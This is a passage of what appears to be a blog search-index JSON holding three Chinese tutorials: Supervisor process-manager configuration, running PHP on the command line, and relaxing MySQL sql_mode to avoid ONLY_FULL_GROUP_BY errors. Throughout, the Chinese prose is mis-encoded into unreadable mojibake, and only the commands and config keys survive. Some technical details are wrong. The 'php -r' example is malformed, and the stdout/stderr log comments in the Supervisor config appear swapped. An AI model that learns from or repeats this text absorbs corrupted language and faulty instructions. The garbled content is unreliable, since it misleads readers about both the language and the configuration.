12[mysqld]sql_mode &#x3D; &quot;&quot; ç„¶åé‡å¯Mysql æœåŠ¡å³å¯ã€‚ å‚è€ƒé“¾æ¥ è®°ä¸€æ¬¡Group by æŸ¥è¯¢æ—¶çš„ONLY_FULL_GROUP_BYé”™è¯¯ä»¥åŠåç»­","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Supervisor å¿«é€Ÿä¸Šæ‰‹","slug":"supervisor-quick-start","date":"2020-07-30T12:38:38.000Z","updated":"2020-09-04T13:54:06.076Z","comments":true,"path":"supervisor-quick-start/","link":"","permalink":"https://www.0x2beace.com/supervisor-quick-start/","excerpt":"supervisord æ˜¯ä¸€ä¸ªç”¨ Python å†™çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œæ˜¯ç±»Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œ Supervisor åªé€‚ç”¨äºç±»Unix ç³»ç»Ÿï¼Œä¸é€‚ç”¨äºWindowã€‚","text":"supervisord æ˜¯ä¸€ä¸ªç”¨ Python å†™çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œæ˜¯ç±»Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œ Supervisor åªé€‚ç”¨äºç±»Unix ç³»ç»Ÿï¼Œä¸é€‚ç”¨äºWindowã€‚ å®‰è£…å› ä¸ºSupervisor æ˜¯ç”¨ Python æ‰€å†™çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨pip å®‰è£…ï¼š 1sudo pip install supervisor Ubuntuï¼š 1apt-get install supervisor Macï¼š 1brew install supervisor é…ç½®Supervisorè¿è¡Œæ—¶ä¼šå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹â€”â€”supervisord ã€‚ supervisordï¼šå®ƒè´Ÿè´£å¯åŠ¨æ‰€ç®¡ç†çš„è¿›ç¨‹ï¼Œå¹¶å°†æ‰€ç®¡ç†çš„è¿›ç¨‹ä½œä¸ºè‡ªå·±çš„å­è¿›ç¨‹æ¥å¯åŠ¨ï¼Œè€Œä¸”å¯ä»¥åœ¨æ‰€ç®¡ç†çš„è¿›ç¨‹å‡ºç°å´©æºƒæ—¶è‡ªåŠ¨é‡å¯ã€‚ supervisorctlï¼šæ˜¯å‘½ä»¤è¡Œç®¡ç†å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œ stopã€startã€restart ç­‰å‘½ä»¤ï¼Œæ¥å¯¹è¿™äº›å­è¿›ç¨‹è¿›è¡Œç®¡ç†ã€‚ æŸ¥çœ‹é»˜è®¤é…ç½®é¡¹ 1$ echo_supervisord_conf å°†é»˜è®¤é…ç½®é¡¹é‡å®šå‘è‡³é…ç½®æ–‡ä»¶ï¼š 1$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf ç„¶åå¯ä»¥çœ‹åˆ° /etc/ é…ç½®æ–‡ä»¶ä¸‹å‡ºç°äº†ä»¥ä¸‹æ–‡ä»¶ï¼Œå…¶ä¸­/etc/supervisor æ˜¯æˆ‘ä»¬éœ€è¦çš„é…ç½®æ–‡ä»¶ã€‚ 1234$ find &#x2F;etc&#x2F; -name supervisor&#x2F;etc&#x2F;default&#x2F;supervisor&#x2F;etc&#x2F;init.d&#x2F;supervisor&#x2F;etc&#x2F;supervisor /etc/supervisord.conf æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œå‚è€ƒä»¥ä¸‹éƒ¨åˆ†é…ç½®ï¼Œ; è¡¨ç¤ºæ³¨é‡Šã€‚ å› ä¸ºSupervisoré»˜è®¤é…ç½®ä¼šæŠŠsocketæ–‡ä»¶å’Œpidå®ˆæŠ¤è¿›ç¨‹ç”Ÿæˆåœ¨/tmp/ç›®å½•ä¸‹ï¼Œ/tmp/ç›®å½•æ˜¯ç¼“å­˜ç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ¢æˆ/var/runç›®å½•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637[unix_http_server];file&#x3D;&#x2F;tmp&#x2F;supervisor.sock ; UNIX socket æ–‡ä»¶ï¼Œsupervisorctl ä¼šä½¿ç”¨file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;run ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤;chmod&#x3D;0700 ; socket æ–‡ä»¶çš„ modeï¼Œé»˜è®¤æ˜¯ 0700;chown&#x3D;nobody:nogroup ; socket æ–‡ä»¶çš„ ownerï¼Œæ ¼å¼ï¼š uid:gid;[inet_http_server] ; HTTP æœåŠ¡å™¨ï¼Œæä¾› web ç®¡ç†ç•Œé¢;port&#x3D;127.0.0.1:9001 ; Web ç®¡ç†åå°è¿è¡Œçš„ IP å’Œç«¯å£ï¼Œå¦‚æœå¼€æ”¾åˆ°å…¬ç½‘ï¼Œéœ€è¦æ³¨æ„å®‰å…¨æ€§;username&#x3D;user ; ç™»å½•ç®¡ç†åå°çš„ç”¨æˆ·å;password&#x3D;123 ; ç™»å½•ç®¡ç†åå°çš„å¯†ç [supervisord];logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; æ—¥å¿—æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ $CWD&#x2F;supervisord.loglogfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;log ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤logfile_maxbytes&#x3D;50MB ; æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œè¶…å‡ºä¼š rotateï¼Œé»˜è®¤ 50MBlogfile_backups&#x3D;10 ; æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤‡ä»½æ•°é‡é»˜è®¤ 10loglevel&#x3D;info ; æ—¥å¿—çº§åˆ«ï¼Œé»˜è®¤ infoï¼Œå…¶å®ƒ: debug,warn,trace;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid æ–‡ä»¶pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;run ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤nodaemon&#x3D;false ; æ˜¯å¦åœ¨å‰å°å¯åŠ¨ï¼Œé»˜è®¤æ˜¯ falseï¼Œå³ä»¥ daemon çš„æ–¹å¼å¯åŠ¨minfds&#x3D;1024 ; å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„æœ€å°å€¼ï¼Œé»˜è®¤ 1024minprocs&#x3D;200 ; å¯ä»¥æ‰“å¼€çš„è¿›ç¨‹æ•°çš„æœ€å°å€¼ï¼Œé»˜è®¤ 200; the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl];serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; é€šè¿‡ UNIX socket è¿æ¥ supervisordï¼Œè·¯å¾„ä¸ unix_http_server éƒ¨åˆ†çš„ file ä¸€è‡´serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;run ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; é€šè¿‡ HTTP çš„æ–¹å¼è¿æ¥ supervisord; åŒ…å«å…¶ä»–çš„é…ç½®æ–‡ä»¶[include]files &#x3D; relative&#x2F;directory&#x2F;*.ini ; å¯ä»¥æ˜¯ *.conf æˆ– *.ini /etc/supervisor/conf.d åˆ™æ˜¯ç”¨æ¥é…ç½®ç®¡ç†è¿›ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰éœ€è¦è¢«supervisor ç®¡ç†çš„è¿›ç¨‹éƒ½éœ€è¦åœ¨è¿™é‡Œå…ˆé…ç½®ã€‚ 123456789101112131415[program:demo]command&#x3D;php demo.php &#x2F;&#x2F; éœ€è¦æ‰§è¡Œé˜Ÿåˆ—çš„åç§°directory&#x3D; &#x2F;var&#x2F;www &#x2F;&#x2F; å‘½ä»¤æ‰§è¡Œçš„ç›®å½•æˆ–è€…è¯´æ‰§è¡Œ command ä¹‹å‰ï¼Œå…ˆåˆ‡æ¢åˆ°å·¥ä½œç›®å½• å¯ä»¥ç†è§£ä¸ºåœ¨æ‰§è¡Œå‘½ä»¤å‰ä¼šåˆ‡æ¢åˆ°è¿™ä¸ªç›®å½• process_name&#x3D;%(process_num)02d &#x2F;&#x2F; é»˜è®¤ä¸º %(program_name)sï¼Œå³ [program:x] ä¸­çš„ xè¿™ä¸ªæ˜¯è¿›ç¨‹åï¼Œå¦‚æœä¸‹é¢çš„numprocså‚æ•°ä¸º1çš„è¯ï¼Œå°±ä¸ç”¨ç®¡è¿™ä¸ªå‚æ•°äº†ï¼Œå®ƒé»˜è®¤å€¼%(program_name)sä¹Ÿå°±æ˜¯ä¸Šé¢çš„é‚£ä¸ªprogramå†’å·åé¢çš„numprocs&#x3D;1 &#x2F;&#x2F; è¿›ç¨‹æ•°é‡å½“ä¸ä¸º1æ—¶çš„æ—¶å€™ï¼Œå°±æ˜¯è¿›ç¨‹æ± çš„æ¦‚å¿µï¼Œæ³¨æ„process_nameçš„è®¾ç½®autostart&#x3D;true &#x2F;&#x2F; æ˜¯å¦è‡ªåŠ¨å¯åŠ¨autorestart&#x3D;true &#x2F;&#x2F; ç¨‹åºæ„å¤–é€€å‡ºæ˜¯å¦è‡ªåŠ¨é‡å¯startsecs&#x3D;1 &#x2F;&#x2F; è‡ªåŠ¨é‡å¯é—´éš” startretries&#x3D;20 &#x2F;&#x2F; å½“è¿›ç¨‹å¯åŠ¨å¤±è´¥åï¼Œæœ€å¤§å°è¯•å¯åŠ¨çš„æ¬¡æ•°ã€‚ã€‚å½“è¶…è¿‡3æ¬¡åï¼Œsupervisorå°†æŠŠæ­¤è¿›ç¨‹çš„çŠ¶æ€ç½®ä¸ºFAIL é»˜è®¤å€¼ä¸º3redirect_stderr&#x3D;true &#x2F;&#x2F; å¦‚æœä¸ºtrueï¼Œåˆ™stderrçš„æ—¥å¿—ä¼šè¢«å†™å…¥stdoutæ—¥å¿—æ–‡ä»¶ä¸­ ç†è§£ä¸ºé‡å®šå‘è¾“å‡ºçš„æ—¥å¿—user&#x3D;root &#x2F;&#x2F; è¿™ä¸ªå‚æ•°å¯ä»¥è®¾ç½®ä¸€ä¸ªérootç”¨æˆ·ï¼Œå½“æˆ‘ä»¬ä»¥rootç”¨æˆ·å¯åŠ¨supervisordä¹‹åã€‚æˆ‘è¿™é‡Œé¢è®¾ç½®çš„è¿™ä¸ªç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥å¯¹supervisordè¿›è¡Œç®¡ç† stopsignal&#x3D;INTstderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log &#x2F;&#x2F; å­è¿›ç¨‹çš„stdoutçš„æ—¥å¿—è·¯å¾„ è¾“å‡ºæ—¥å¿—æ–‡ä»¶stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log &#x2F;&#x2F; é”™è¯¯æ—¥å¿—æ–‡ä»¶ å½“redirect_stderr&#x3D;trueã€‚è¿™ä¸ªå°±ä¸ç”¨ å¯åŠ¨1$ supervisord -c &#x2F;etc&#x2F;supervisord.conf å¸¸ç”¨å‘½ä»¤æ•´ç†åœæ­¢è¿›ç¨‹ï¼Œprogram_name ä¸º [program:x] é‡Œçš„ x 1supervisorctl stop program_name å¯åŠ¨è¿›ç¨‹ 1supervisorctl start program_name é‡å¯è¿›ç¨‹ 1supervisorctl restart program_name ç»“æŸæ‰€æœ‰å±äºåä¸º groupworker è¿™ä¸ªåˆ†ç»„çš„è¿›ç¨‹ (startï¼Œrestart åŒç†) 1supervisorctl stop groupworker: ç»“æŸ groupworker:name1 è¿™ä¸ªè¿›ç¨‹ (startï¼Œrestart åŒç†) 1supervisorctl stop groupworker:name1 åœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stop éƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ 1supervisorctl stop all è½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œåœæ­¢åŸæœ‰è¿›ç¨‹å¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ 1supervisorctl reload æ ¹æ®æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨æ–°é…ç½®æˆ–æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ï¼Œé…ç½®æ²¡æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ä¸ä¼šå—å½±å“è€Œé‡å¯ 1supervisorctl update å¸¸è§é—®é¢˜unlinking stale socket /var/run/supervisor.sock1234$ find &#x2F; -name supervisor.sock&#x2F;run&#x2F;supervisor.sock$ unlink &#x2F;run&#x2F;supervisor.sock å‚è€ƒé“¾æ¥ â€œunix:///tmp/supervisor.sock no such fileâ€ é”™è¯¯å¤„ç† https://segmentfault.com/a/1190000015768529 ä½¿ç”¨ supervisor ç®¡ç†è¿›ç¨‹ Python è¿›ç¨‹ç®¡ç†å·¥å…· Supervisor ä½¿ç”¨æ•™ç¨‹","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"PHP/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"}]},{"title":"åœ¨ Linux å‘½ä»¤è¡Œä¸­æ‰§è¡Œå’Œä½¿ç”¨ PHP ä»£ç ","slug":"execute-and-use-php-code-on-the-linux-command-line","date":"2020-07-29T00:08:12.000Z","updated":"2020-11-27T03:05:13.069Z","comments":true,"path":"execute-and-use-php-code-on-the-linux-command-line/","link":"","permalink":"https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/","excerpt":"ä¼—æ‰€å‘¨çŸ¥ï¼ŒPHPæ˜¯ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œä¸»è¦ç”¨äºæœåŠ¡ç«¯ï¼ˆJavaScript ç”¨äºå®¢æˆ·ç«¯ï¼‰ä»¥é€šè¿‡HTTP ç”ŸæˆåŠ¨æ€ç½‘é¡µã€‚","text":"ä¼—æ‰€å‘¨çŸ¥ï¼ŒPHPæ˜¯ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œä¸»è¦ç”¨äºæœåŠ¡ç«¯ï¼ˆJavaScript ç”¨äºå®¢æˆ·ç«¯ï¼‰ä»¥é€šè¿‡HTTP ç”ŸæˆåŠ¨æ€ç½‘é¡µã€‚ æ‰€ä»¥ä¸å…¶ä»–è„šæœ¬è¯­è¨€ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯ä¸­ä¸éœ€è¦ç½‘é¡µæµè§ˆå™¨æ¥è¿è¡ŒPHP ä»£ç ã€‚ è·å–å®‰è£…ä¿¡æ¯åœ¨å®‰è£…å®ŒPHP ä»¥åŠNginx ä¹‹åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šå¸¸éœ€è¦åšçš„æ˜¯ï¼Œåœ¨/usr/local/var/www (Mac ä¸Šçš„Nginx å·¥ä½œç›®å½•)ä¸Šåˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º&lt;?php phpinfo(); ?&gt;ï¼Œåä¸ºindex.phpçš„æ–‡ä»¶æ¥æµ‹è¯•PHP æ˜¯å¦å®‰è£…æ­£ç¡®ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š 1# echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php ç„¶åï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®http://127.0.0.1/index.phpï¼Œä¸å‡ºæ„å¤–å¯ä»¥çœ‹åˆ°ï¼š å¦‚ä½•åœ¨ç»ˆç«¯ä¸­ç›´æ¥æŸ¥çœ‹è¯¥ä¿¡æ¯ï¼Ÿ 1# php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less å¦‚æœä½ è§‰å¾—ä¸Šé¢è¿™ç§æ–¹å¼å¤ªéº»çƒ¦äº†ï¼Œé‚£ä¹ˆè¿˜æœ‰ä¸€ç§æ›´ç®€ä¾¿çš„æ–¹å¼å¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚ 1# php -r &#39;php phpinfo();&#39; | less äº¤äº’æ¨¡å¼æœ‰æ—¶å€™æˆ‘ä»¬ä¼šé‡åˆ°è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæƒ³æµ‹è¯•ä¸€å°æ®µä»£ç ï¼Œçœ‹çœ‹å…¶è¿è¡Œç»“æœï¼Œä½†æ˜¯åˆä¸æƒ³é‡æ–°åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¤ªéº»çƒ¦äº†ã€‚ å¦‚æœè¿™ä¸ªæ—¶å€™æœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥ç›´æ¥è¿è¡Œè¿™æ®µä»£ç ä¸”è¾“å‡ºç»“æœï¼Œé‚£è¯¥å¤šå¥½å•Šã€‚ PHP ä¸ºæˆ‘ä»¬æä¾›äº†ä¸¤ç§äº¤äº’æ¨¡å¼ï¼Œå‰è€…æ˜¯è‡ªåŠ¨çš„ï¼Œåè€…æ˜¯æ‰‹åŠ¨çš„ã€‚ Interactive shell Interactive mode enabled ä¸¤ç§æ¨¡å¼éƒ½æ˜¯ä½¿ç”¨ php -a å‘½ä»¤è¿›å…¥ã€‚ Interactive shellä½¿ç”¨è¿™ä¸ªäº¤äº’å¼shellï¼Œä½ å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œçª—å£é‡Œè¾“å…¥PHPå¹¶ç›´æ¥è·å¾—è¾“å‡ºç»“æœã€‚ 1234567$ php -aInteractive shellphp &gt;echo &quot;Hello PHP&quot;;Hello PHPphp &gt; echo 10+90;100 å›è½¦å³å¯æŸ¥çœ‹è¾“å‡ºå†…å®¹ã€‚ Interactive mode enabled1234$ php -aInteractive mode enabledphp &gt;echo &quot;Hello PHP&quot;; å¦‚æœå‡ºç°çš„æ˜¯è¿™ä¸ªæ¨¡å¼ï¼Œè¯´æ˜ä½ çš„PHPå¹¶ä¸æ”¯æŒäº¤äº’å¼shellï¼Œ ä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼Œè¿™ä¸ªæ¨¡å¼åŒæ ·ä¹Ÿå¯ä»¥æ‰§è¡ŒPHP ä»£ç ï¼Œåªæ˜¯ä»£ç çš„æ‰§è¡Œæ–¹å¼æœ‰äº›åŒºåˆ«ã€‚ è¾“å…¥äº†æ‰€æœ‰PHPä»£ç åï¼Œè¾“å…¥Ctrl-Zï¼ˆwindowsé‡Œï¼‰ï¼Œæˆ–è¾“å…¥Ctrl-Dï¼ˆlinuxé‡Œï¼‰ï¼Œä½ è¾“å…¥çš„æ‰€æœ‰ä»£ç å°†ä¼šä¸€æ¬¡æ‰§è¡Œå®Œæˆå¹¶è¾“å‡ºç»“æœã€‚ è¾“å…¥exitæˆ–è€…âŒƒ + c é€€å‡ºäº¤äº’æ¨¡å¼ã€‚ PHP è„šæœ¬åœ¨ç»ˆç«¯ä¸­å¯ä»¥æŠŠPHP è„šæœ¬ä½œä¸ºShell è„šæœ¬æ¥è¿è¡Œã€‚ é¦–å…ˆä½ éœ€è¦åˆ›å»ºä¸€ä¸ªPHP è„šæœ¬æ–‡ä»¶ï¼š 1# echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php -e è¡¨ç¤ºæ¿€æ´»è½¬ä¹‰å­—ç¬¦ã€‚ æ³¨æ„ï¼Œè¿™ä¸ªè„šæœ¬æ–‡ä»¶ä¸­çš„ç¬¬ä¸€è¡Œ#!/usr/bin/phpï¼Œå°±åƒæ˜¯Shell è„šæœ¬ä¸­çš„#!/bin/bashã€‚ç›®çš„æ˜¯å‘Šè¯‰Linux å‘½ä»¤è¡Œä½¿ç”¨PHP è§£æå™¨æ¥è§£æè¯¥æ–‡ä»¶ã€‚ è¿è¡Œè¯¥è„šæœ¬ï¼š 12# chmod +x phpscript.php &#x2F;&#x2F; ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™# .&#x2F;phpscript.php &#x2F;&#x2F;æ‰§è¡Œè„šæœ¬ PHP æœåŠ¡PHP æœ‰å†…ç½®ä¸€ä¸ªWebServerï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿å¿«é€Ÿçš„æ­å»ºä¸€ä¸ªPHP æœåŠ¡ã€‚ 1$ php -t &#x2F;project to path -S localhost:port ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®localhost:port å°±å¯ä»¥äº†ã€‚ æ€»ç»“ php -aï¼šè¿›å…¥äº¤äº’æ¨¡å¼ php -fï¼šè§£æå’Œæ‰§è¡Œæ–‡ä»¶ php -hï¼šè·å–å¸®åŠ© php -iï¼šæŸ¥çœ‹PHP ä¿¡æ¯å’Œé…ç½® php -mï¼šæ˜¾ç¤ºå·²ç»å®‰è£…çš„æ¨¡å— php -rï¼šè¿è¡ŒPHPä»£ç ä¸ä½¿ç”¨è„šæœ¬æ ‡ç­¾â€™â€˜ php -vï¼šæŸ¥çœ‹PHP ç‰ˆæœ¬ php -iniï¼šæŸ¥çœ‹åŠ è½½é…ç½®æ–‡ä»¶ï¼ˆphp.iniã€conf.dï¼‰ php -i | grep configureï¼šæŸ¥çœ‹é™æ€ç¼–è¯‘æ¨¡å— php --ri swooleï¼šæŸ¥çœ‹æŒ‡å®šæ¨¡å—çš„é…ç½® locate php.iniï¼šæŸ¥è¯¢æœ¬åœ°é…ç½®æ–‡ä»¶ time php script.phpï¼šæŸ¥çœ‹ç¨‹åºçš„æ‰§è¡Œæ—¶é—´ å‚è€ƒé“¾æ¥ åœ¨ Linux å‘½ä»¤è¡Œä¸­æ‰§è¡Œå’Œä½¿ç”¨ PHP ä»£ç  12 ä¸ª Linux ç»ˆç«¯ä¸­æœ‰ç”¨çš„ PHP å‘½ä»¤è¡Œç”¨æ³•","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å¦‚ä½•è§£å†³â€œORDER BYå­å¥ä¸åœ¨SELECTåˆ—è¡¨ä¸­â€çš„é—®é¢˜","slug":"list-causes-mysql-5-7-with-select-distinct-and-order-by","date":"2020-07-28T00:29:37.000Z","updated":"2020-07-28T15:28:10.444Z","comments":true,"path":"list-causes-mysql-5-7-with-select-distinct-and-order-by/","link":"","permalink":"https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/","excerpt":"è®°å½•ä¸€ä¸ªæœ€è¿‘é‡åˆ°çš„Mysql é—®é¢˜ã€‚","text":"è®°å½•ä¸€ä¸ªæœ€è¿‘é‡åˆ°çš„Mysql é—®é¢˜ã€‚ é—®é¢˜æè¿°ï¼šåœ¨æœ¬åœ°é¡¹ç›®ä¸­ï¼Œéƒ¨åˆ†SQL è¯­å¥æ‰§è¡Œèµ·æ¥ï¼Œæ€»æ˜¯ä¼šæŠ¥ä¸€ä¸ªé”™ã€‚è€ŒåŒæ ·çš„SQLï¼Œåœ¨çº¿ä¸Šçš„æœåŠ¡å™¨ä¸­æ‰§è¡Œèµ·æ¥æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ é”™è¯¯æç¤ºå†…å®¹ï¼š 1Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query æˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯æ£€æŸ¥Mysql çš„ç‰ˆæœ¬ï¼Œå¾ˆå·§çš„æ˜¯æœ¬åœ°Mysqlçš„ç‰ˆæœ¬ç¡®å®æ¯”æœåŠ¡å™¨çš„ç‰ˆæœ¬ä½ä¸€äº›ã€‚å¾ˆå¿«æˆ‘å°±æƒ³åˆ°ä¸€å®šæ˜¯ç‰ˆæœ¬å­˜åœ¨å·®å¼‚æ€§ï¼Œå¯¼è‡´è¯­æ³•ä¸å…¼å®¹ã€‚ å‡çº§Mysqlæ—¢ç„¶æ˜¯ç‰ˆæœ¬ä¸ä¸€çš„é—®é¢˜ï¼Œé‚£å°±å‡çº§æœ¬åœ°çš„Mysql å¥½äº†ã€‚ å› ä¸ºæˆ‘çš„Mysql æ˜¯ä¹‹å‰é€šè¿‡Homebrew å®‰è£…çš„ï¼Œæ‰€ä»¥å¦‚éœ€è¦å‡çº§ï¼Œæ ¹æœ¬ä¸ç”¨æˆ‘è‡ªå·±æ‰‹åŠ¨å»å¯»æ‰¾å®‰è£…åŒ…ï¼Œç›´æ¥é€šè¿‡Homebrew çš„Upgrade å‘½ä»¤è‡ªåŠ¨å‡çº§å°±å¥½äº†ã€‚ èµ·åˆæˆ‘è¿˜æ‹…å¿ƒè‡ªåŠ¨å‡çº§ä¼šä¸ä¼šæŠŠæˆ‘çš„Mysql çš„ç‰ˆæœ¬æ›´æ–°çš„5.7ä»¥ä¸Šï¼Œåæ¥è¯æ˜æ˜¯æˆ‘æƒ³å¤šäº†ã€‚ ä¸è¿‡åœ¨æ­£å¼æ›´æ–°ä¹‹å‰éœ€è¦åšå¥½ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š å¯¹æ•°æ®åº“åšå¥½å¿…è¦çš„å¤‡ä»½ åœæ­¢æœ¬åœ°Mysql æœåŠ¡ ç¡®å®šæ‰€è¦æ›´æ–°çš„Mysql ç‰ˆæœ¬ åšå¥½ä»¥ä¸Šä¸‰ä»¶äº‹ä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹å‡çº§äº†ã€‚ 1234$ brew search mysqlmysql@5.7 âœ”$ brew upgrade mysql@5.7... ç»ˆäºå®‰è£…å¥½ä¹‹åï¼Œå†æ¬¡å¼€å¯Mysql çš„æœåŠ¡ï¼Œæˆ‘å‘ç°è¿˜æ˜¯æ²¡æœ‰è§£å†³æˆ‘çš„é—®é¢˜ï¼Œè¿˜æ˜¯ä¼šæç¤ºç›¸åŒçš„é”™è¯¯ã€‚ è¿™æ—¶å€™æˆ‘æ‰æ„è¯†åˆ°è¿™ä¸ªé—®é¢˜å’ŒMysql çš„ç‰ˆæœ¬æ²¡æœ‰å…³ç³»ï¼Œæœ‰å…³ç³»åº”è¯¥æ˜¯ç›¸å…³çš„æ¨¡å—ã€‚ é€šè¿‡æŸ¥é˜…ä¸€ç•ªèµ„æ–™ï¼Œæ‰å‘ç°æ˜¯å› ä¸º group by ä¸­çš„åˆ—ä¸€å®šè¦å‡ºç°åœ¨ select ä¸­ï¼Œé™¤éå¼ºåˆ¶ sqlmode ä¸­ä½¿ç”¨ ONLY_FULL_GROUP_BYã€‚ å¼€å¯sql-mode æ¨¡å¼123456789$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf# å¢åŠ å¦‚ä¸‹å†…å®¹[mysqld]sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;# æˆ–è€…[mysqld]sql_mode &#x3D; &quot;&quot; é‡å¯Mysql æœåŠ¡å™¨ï¼Œå³å¯ã€‚ å‚è€ƒé“¾æ¥ å¦‚ä½•è§£å†³ MySQL 5.7å¸¦æœ‰SELECT DISTINCTå’ŒORDER BYçš„é—®é¢˜ | stack voerflow Mysql æœåŠ¡å™¨SQL 